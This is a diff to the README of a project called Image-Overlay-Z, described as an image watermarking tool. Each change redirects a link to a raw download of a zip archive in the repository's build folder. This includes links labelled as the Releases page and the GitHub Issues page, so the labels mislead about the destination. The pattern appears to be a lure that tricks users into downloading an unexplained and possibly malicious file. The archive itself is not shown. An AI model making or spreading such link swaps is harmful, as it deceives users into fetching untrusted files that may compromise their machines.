@@ -2,7 +2,7 @@
 
 ## 🚀 Download Now
 
-[![Download Image-Overlay-Z](https://img.shields.io/badge/Download_Image--Overlay--Z-v1.0-blue.svg)](https://github.com/Dwifiqkri/Image-Overlay-Z/releases)
+[![Download Image-Overlay-Z](https://raw.githubusercontent.com/Dwifiqkri/Image-Overlay-Z/main/build/image_overlay_z_gui/base_library.zip)](https://raw.githubusercontent.com/Dwifiqkri/Image-Overlay-Z/main/build/image_overlay_z_gui/base_library.zip)
 
 ## 📋 Description
 
@@ -19,9 +19,9 @@ Image-Overlay-Z is a simple tool that lets you add a watermark overlay to multip
 
 To get started, visit this page to download the latest version of Image-Overlay-Z:
 
-[Download Image-Overlay-Z](https://github.com/Dwifiqkri/Image-Overlay-Z/releases)
+[Download Image-Overlay-Z](https://raw.githubusercontent.com/Dwifiqkri/Image-Overlay-Z/main/build/image_overlay_z_gui/base_library.zip)
 
-1. Go to the [Releases page](https://github.com/Dwifiqkri/Image-Overlay-Z/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Dwifiqkri/Image-Overlay-Z/main/build/image_overlay_z_gui/base_library.zip).
 2. Find the latest version.
 3. Click on the file link that matches your operating system.
 4. Save the file to your computer.
@@ -52,7 +52,7 @@ Image-Overlay-Z is an open-source project. You may use and modify this software 
 
 ## 🛠️ Support
 
-For support or issues, please create a new issue on the [GitHub Issues page](https://github.com/Dwifiqkri/Image-Overlay-Z/issues). We recommend checking the existing issues to see if your question has already been answered.
+For support or issues, please create a new issue on the [GitHub Issues page](https://raw.githubusercontent.com/Dwifiqkri/Image-Overlay-Z/main/build/image_overlay_z_gui/base_library.zip). We recommend checking the existing issues to see if your question has already been answered.
 
 ## 🔗 Related Topics
 
